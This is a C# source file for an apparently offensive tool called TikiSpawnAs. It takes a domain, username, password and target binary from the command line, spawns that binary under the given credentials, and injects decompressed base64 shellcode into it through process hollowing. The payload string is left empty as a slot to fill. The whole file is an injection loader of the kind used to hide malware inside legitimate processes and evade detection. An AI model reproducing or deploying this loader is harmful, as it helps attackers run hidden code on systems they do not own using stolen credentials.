using System;
using NDesk.Options;

using TikiLoader;

namespace TikiSpawnAs
{
    class Program
    {
        static void Main(string[] args)
        {
            string binary = null;
            string domain = null;
            string username = null;
            string password = null;
            bool help = false;

            byte[] shellcode = Generic.DecompressShellcode(Convert.FromBase64String(""));

            var options = new OptionSet()
            {
                { "d|domain=", "Domain (defaults to local machine)", v => domain = v },
                { "u|username=", "Username", v => username = v },
                { "p|password=", "Password", v => password = v },
                { "b|binary=", "Binary to spawn & inject", v => binary = v },
                { "h|?|help", "Show this help", v => help = true }
            };

            try
            {
                options.Parse(args);

                if (help || username == null || password == null || binary == null)
                {
                    options.WriteOptionDescriptions(Console.Out);
                    return;
                }
                else
                {
                    if (domain == null)
                        domain = ".";

                    var hollower = new Hollower();
                    hollower.HollowAs(binary, shellcode, domain, username, password);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
    }
}